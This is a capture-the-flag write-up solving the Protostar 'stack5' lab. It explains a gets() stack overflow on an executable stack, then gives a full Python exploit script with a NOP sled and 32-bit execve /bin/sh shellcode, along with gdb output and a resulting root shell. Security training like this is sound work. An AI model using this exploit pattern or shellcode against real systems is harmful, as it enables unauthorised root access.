# Stack5 Solution

## C Code

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Vulnerability

Ok, so now we have some *very* minimal C code with just a `char buffer[64]` and get(buffer)` From this, we need to get a **root shell**.
You may be thinking, *how do we do that*. The answer lies in **executing shellcode put on the stack** by abusing `gets()`. Let me explain.

You know how we can **edit the stack** by using a **buffer overflow**? We can also **put values on the stack** and if **EIP points to it**,
the stack value(s) will **execute**. This is preventable by using a system called **NX**, which stands no **No-Execution**. This system
**prevents stack values from being executed**, which is useful to prevent this style of attack.

Now that we know that **the stack is executable**, can we **put shellcode on the stack, then execute** it by **overwriting the return
address to point to that shellcode**? **Yes, we can**! So let's do it!

First, we need to **make sure that the shellcode is always executed**. To do that, we use something called a **NOP sled**. A `nop`
instruction basically just **moves to the next instruction**. So we can place a **bunch of NOPs above our shellcode** (shellcode is the code
needed to create a shell) and then we basically have some **room for error**, since we could return **anywhere inside of the NOP sled** and
still execute our shellcode.

**So let's exploit!**

## Exploit

First, let's **reuse** the **padding** from [stack4](https://github.com/Naksh-Rathore/protostar-solutions/tree/main/stack4/) so we do not have to check what the padding is *again*.

We first need the **return address's** memory address to use as a estimate of the NOP sled address.

```bash
(gdb) break *main+22
(gdb) r
QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM

SIGSEV - Segmentation Fault
```

Now, since **the next thing on the stack is the memory address, let's get ESP**, since that will point to the return address.

```bash
(gdb) p $esp
$1 = (void *) 0xbffff7d0
```

Now that we know **the memory address** of the return address, we can make the return address point to **it's memory address + ~30 bytes** to reach the middle of the NOP sled.

But now we need **shellcode**. Let's use the **32 bit execve** `/bin/sh` **shellcode** from **ShellStorm**. I have linked it in the resources section. 

Here is our **payload layout**:

```
[ 72 bytes of padding ]
[ 4 bytes to overwrite EBP ]
[ 4 bytes to overwrite return address ]
[ NOP sled containing 100 NOPs ]
[ Shellcode ]
```

Ok, so let's build the exploit script:

```python
import struct

padding = "A" * 72
ebp = "LLLL"
ret_addr = struct.pack("I", 0xbffff7d0 + 30)
shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73"
        "\x68\x68\x2f\x62\x69\x6e\x89"
        "\xe3\x89\xc1\x89\xc2\xb0\x0b"
        "\xcd\x80\x31\xc0\x40\xcd\x80"
)
nop_sled = "\x90" * 100

print(padding + ebp + ret_addr + nop_sled + shellcode)
```

To **properly run**, we need to redirect the stdin to stdout with the `cat` command.

Result:

```bash
$ (python /tmp/exploit.py; cat) | /opt/protostar/bin/stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALLLL????????????????????????????????????????????????????????????????????????????????????????????????????????1?Ph//shh/bin????°
                                      ̀1?@̀

whoami
root
```

## Resources

* [C Code](https://exploit.education/protostar/stack-five/)
* [/bin/sh ShellCode from ShellStorm](https://shell-storm.org/shellcode/files/shellcode-811.html)
* [LiveOverflow's Solution on YouTube](https://www.youtube.com/watch?v=HSlhY4Uy8SA)
* [Wikipedia Article on the NX Bit](https://en.wikipedia.org/wiki/NX_bit)

